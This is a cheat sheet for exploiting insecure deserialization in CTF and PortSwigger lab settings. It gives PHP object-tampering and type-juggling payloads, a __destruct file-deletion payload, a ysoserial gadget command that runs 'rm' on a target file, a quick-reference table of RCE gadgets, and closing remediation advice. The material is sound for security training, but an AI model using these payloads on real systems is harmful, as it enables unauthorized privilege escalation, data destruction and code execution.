# Insecure Deserialization — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, ysoserial, CyberChef  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

Insecure deserialization occurs when untrusted data is used to recreate an object without sufficient validation, leading to privilege escalation, arbitrary file manipulation, or Remote Code Execution (RCE).

1. **Identify Serialized Objects:**
   - **PHP:** `O:4:"User":2:{s:8:"username";s:6:"wiener";...}` (often URL-encoded or base64).
   - **Java:** Starts with hex magic bytes `ac ed 00 05` (Base64 starts with `rO0AB`).
   - **Python (Pickle):** Hex bytes `80 03` or `80 04` (Base64 starts with `gASV...`).
   - **Ruby:** Hex bytes `04 08` (`\x04\x08`).
   - **.NET:** BinaryFormatter, ViewState (`/wEPDw...`), `TypeNameHandling.All` in JSON.NET.
2. **Determine Attack Vector:**
   - **Privilege Escalation:** Tamper with object properties (e.g. `admin = true`).
   - **Type Juggling:** Exploit loose equality comparisons (e.g. integer `0` matching a string password).
   - **Magic Methods / Pop Chains:** Exploit methods executed automatically on destruction/instantiation (`__destruct()`, `__wakeup()`, `readObject()`).
   - **Known Gadget Chains:** Use tools like `ysoserial` for Java/PHP to trigger RCE.

---

## 2. PHP Deserialization Exploits

### 1. Privilege Escalation (Object Property Tampering)
Target cookie contains base64-encoded serialized object:
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
- **Exploitation:** Change boolean `b:0;` to `b:1;`:
  ```php
  O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
  ```
- Base64 encode and replace the session cookie.

---

### 2. PHP Loose Type Juggling
In PHP, loose comparison (`==`) evaluates `0 == "alphanumeric_password"` as `true`:
- Original object:
  ```php
  O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"d89f2a74c...";}
  ```
- **Exploitation:** Change string type `s:32:"..."` to integer `i:0`:
  ```php
  O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
  ```

---

### 3. File Deletion via Magic Methods (`__destruct`)
Inspect application source code or leaked files for magic methods:
```php
class User {
    public $avatar_link;
    function __destruct() {
        @unlink($this->avatar_link);
    }
}
```
- **Exploitation:** Point `$avatar_link` to target file to delete it upon object destruction:
  ```php
  O:4:"User":1:{s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
  ```

---

## 3. Java Deserialization & ysoserial

### Identifying Java Serialization
- Look for cookies or POST bodies starting with `rO0AB` (Base64 for `ac ed 00 05` Stream Magic).
- Inspect response errors containing `java.io.ObjectInputStream` or `ClassNotFoundException`.

### Exploiting with ysoserial
1. Identify backend libraries from error traces (e.g. Apache Commons Collections 4).
2. Generate gadget payload using `ysoserial`:
   ```bash
   java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
   ```
3. Insert base64 string into the vulnerable serialized cookie/parameter.

---

## 4. Ruby Deserialization

Serialized Ruby objects begin with `\x04\x08` (Base64 `BAh...`):
- Modern Ruby RCE chains abuse `Gem::SpecFetcher` or `Universal` gadget chains to execute arbitrary system commands during deserialization.

---

## 5. CTF Quick Reference

| Runtime | Serialization Format | Fast Identifier | High-Yield Exploit |
|---|---|---|---|
| **PHP** | `O:len:"Name":...` | `O:4:"User"` | Property tampering (`admin=1`), Type juggling (`i:0`) |
| **Java** | Binary object stream | Base64: `rO0AB` | `ysoserial CommonsCollections4 '<cmd>'` |
| **Python** | Pickle | Base64: `gASV...` | `__reduce__()` returning `os.system` |
| **.NET** | BinaryFormatter | Base64: `AAEAAAD...` | `ysoserial.net -g TypeConfuseDelegate -c "<cmd>"` |
| **Ruby** | Marshal | Base64: `BAh...` | Marshal gadget chain execution |

---

## 6. Remediation

- **Never deserialize untrusted data:** Use safe serialization formats like JSON, YAML (with safe loaders), or Protocol Buffers.
- **Implement Cryptographic Signatures (HMAC):** If serialization is unavoidable, verify integrity with an HMAC before passing data to the deserializer.
- **Class Filtering:** Enforce strict allowlists with `ValidatingObjectInputStream` (Java) to block unauthorized classes from being loaded.
